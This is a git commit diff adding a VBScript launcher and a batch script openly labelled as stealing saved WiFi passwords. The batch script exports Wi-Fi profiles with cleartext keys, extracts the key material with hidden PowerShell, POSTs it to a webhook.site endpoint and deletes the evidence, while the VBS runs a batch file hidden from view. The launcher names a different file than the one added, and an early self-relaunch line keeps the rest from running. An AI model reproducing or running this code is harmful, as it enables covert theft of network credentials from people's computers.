e879209e705a92d0c0e801609d5f4b7efc3bba6c
DARK_BLACK <157338414+darkblackorganization@users.noreply.github.com>
2024-10-16 04:32:49 +0530

    Add files via upload

---
+++ wifi.vbs
@@ -0,0 +1,2 @@
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "wifi.bat", 0, False
---
+++ wifi_2.bat
@@ -0,0 +1,30 @@
+@echo off
+REM Batch Script to Steal Saved WiFi Password
+REM Author - bittu
+
+start /min "" "%~f0"
+exit
+
+timeout /t 2 /nobreak >nul
+
+cd %temp%
+
+timeout /t 1 /nobreak >nul
+
+netsh wlan export profile key=clear
+
+timeout /t 2 /nobreak >nul
+
+powershell -WindowStyle Hidden -Command "Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > WiFi-Key"
+
+timeout /t 2 /nobreak >nul
+
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri https://webhook.site/<paste webhook unique id here> -Method POST -InFile WiFi-Key"
+
+timeout /t 2 /nobreak >nul
+
+del Wi* /s /f /q
+
+timeout /t 1 /nobreak >nul
+
+exit
